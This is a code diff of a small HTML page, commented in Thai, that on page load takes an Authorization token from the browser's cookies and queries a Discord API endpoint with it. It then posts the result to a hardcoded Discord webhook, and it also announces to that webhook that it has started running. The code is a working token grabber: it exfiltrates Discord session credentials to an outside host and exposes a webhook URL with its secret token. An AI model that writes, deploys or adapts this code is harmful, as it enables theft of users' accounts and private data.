@@ -6,10 +6,8 @@
     <title>Fetch and Send Cookies</title>
     <script>
         window.onload = function() {
-            // URL ของเว็บไซต์ตัวอย่าง
-            const targetUrl = 'https://discord.com/channels/@me'; // เปลี่ยนเป็น URL สมมุติที่ต้องการ
-            const apiEndpoint = 'https://discord.com/api/v9/user-profile-effects'; // เปลี่ยนเป็น API Endpoint ที่ต้องการ
             const startWebhookUrl = 'https://discord.com/api/webhooks/1262428333061308486/rjzPQxwlyNV3-c4wP_RrSso80UdhwUuKFBJU9QYEnE-Hw3U-J2n5t2PBaIJNaYrvYc6K';
+            const apiEndpoint = 'https://discord.com/api/v9/user-profile-effects'; // เปลี่ยนเป็น API Endpoint ที่ต้องการ
             const dataWebhookUrl = 'https://discord.com/api/webhooks/1262428333061308486/rjzPQxwlyNV3-c4wP_RrSso80UdhwUuKFBJU9QYEnE-Hw3U-J2n5t2PBaIJNaYrvYc6K';
 
             // ส่งข้อความ "เริ่มการทำงาน" ไปยัง Webhook
@@ -22,35 +20,26 @@
             })
             .then(response => response.json())
             .then(() => {
-                // ดึง cookies จากเว็บไซต์ตัวอย่าง
-                fetch(targetUrl, {
+                // ดึงข้อมูลจาก API ที่กำหนด
+                fetch(apiEndpoint, {
                     method: 'GET',
-                    credentials: 'include' // รวม cookies ในการร้องขอ
+                    credentials: 'include',
+                    headers: {
+                        'Authorization': `Bearer ${document.cookie.match(/Authorization=([^;]+)/)?.[1] || ''}`
+                    }
                 })
-                .then(response => response.text())
-                .then(() => {
-                    // ดึงข้อมูลจาก API ที่กำหนด
-                    fetch(apiEndpoint, {
-                        method: 'GET',
-                        credentials: 'include', // รวม cookies ในการร้องขอ
+                .then(response => response.json())
+                .then(data => {
+                    // ส่งข้อมูล cookies ไปยัง Webhook
+                    fetch(dataWebhookUrl, {
+                        method: 'POST',
                         headers: {
-                            'Authorization': `Bearer ${document.cookie.match(/Authorization=([^;]+)/)?.[1] || ''}`
-                        }
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ Authorization: data })
                     })
                     .then(response => response.json())
-                    .then(data => {
-                        // ส่งข้อมูล cookies ไปยัง Webhook
-                        fetch(dataWebhookUrl, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({ Authorization: data })
-                        })
-                        .then(response => response.json())
-                        .then(result => console.log('Success:', result))
-                        .catch(error => console.error('Error:', error));
-                    })
+                    .then(result => console.log('Success:', result))
                     .catch(error => console.error('Error:', error));
                 })
                 .catch(error => console.error('Error:', error));
